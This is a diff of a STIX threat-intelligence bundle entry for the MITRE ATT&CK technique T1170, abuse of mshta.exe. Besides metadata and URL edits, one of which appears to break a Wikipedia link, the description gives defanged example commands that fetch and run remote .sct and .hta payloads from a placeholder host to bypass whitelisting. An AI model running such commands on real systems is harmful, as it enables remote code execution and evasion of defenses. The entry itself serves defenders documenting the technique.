@@ -1,6 +1,6 @@
 {
     "type": "bundle",
-    "id": "bundle--9c88c5d2-f079-46df-b6b9-609f294874a8",
+    "id": "bundle--136a3c50-3a24-48a8-ad30-71e10e0077fe",
     "spec_version": "2.0",
     "objects": [
         {
@@ -8,7 +8,7 @@
             "id": "attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec",
             "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
             "created": "2018-01-16T16:13:52.465Z",
-            "modified": "2018-06-27T14:18:47.700Z",
+            "modified": "2018-07-03T13:33:43.876Z",
             "name": "Mshta",
             "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nAdversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: GitHub SubTee The List)",
             "kill_chain_phases": [
@@ -24,11 +24,11 @@
             "external_references": [
                 {
                     "external_id": "T1170",
-                    "url": "https://attack.mitre.org/wiki/Technique/T1170",
+                    "url": "https://attack.mitre.org/technique/T1170",
                     "source_name": "mitre-attack"
                 },
                 {
-                    "url": "https://en.wikipedia.org/wiki/HTML%20Application",
+                    "url": "https://en.wikipedia.org/HTML%20Application",
                     "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
                     "source_name": "Wikipedia HTML Application"
                 },
